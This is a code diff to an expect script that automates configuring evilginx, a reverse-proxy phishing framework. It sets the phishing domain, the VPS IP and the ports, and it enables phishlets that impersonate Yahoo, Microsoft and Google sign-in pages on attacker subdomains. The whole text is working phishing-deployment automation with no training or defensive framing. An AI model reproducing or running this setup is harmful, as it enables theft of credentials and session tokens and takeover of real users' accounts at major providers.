@@ -623,24 +623,26 @@ log_user 1
 spawn /usr/local/bin/evilginx -c $EVILGINX_DIR -p $EVILGINX_DIR/phishlets
 
 expect {
-    "successfully set up all TLS certificates" {
-        # Banner is done, listeners are up. Now we configure.
-        expect -re "evilginx\s+>\s*$"
+    "blacklist: loaded" {
+        # Engine is initialized and database is ready for commands
+        expect -re ">"
         
         send "config domain $DOMAIN\r"
-        expect -re "evilginx\s+>\s*$"
+        expect -re ">"
         send "config ipv4 external $VPS_IP\r"
-        expect -re "evilginx\s+>\s*$"
+        expect -re ">"
         send "config https_port 8443\r"
-        expect -re "evilginx\s+>\s*$"
+        expect -re ">"
+        send "config dns_port 0\r"
+        expect -re ">"
         
         # Enable phishlets
         send "phishlets hostname yahoo $EP1.$DOMAIN\r"
-        expect -re "evilginx\s+>\s*$"
+        expect -re ">"
         send "phishlets hostname microsoft $EP2.$DOMAIN\r"
-        expect -re "evilginx\s+>\s*$"
+        expect -re ">"
         send "phishlets hostname google $EP3.$DOMAIN\r"
-        expect -re "evilginx\s+>\s*$"
+        expect -re ">"
         
         send "exit\r"
     }
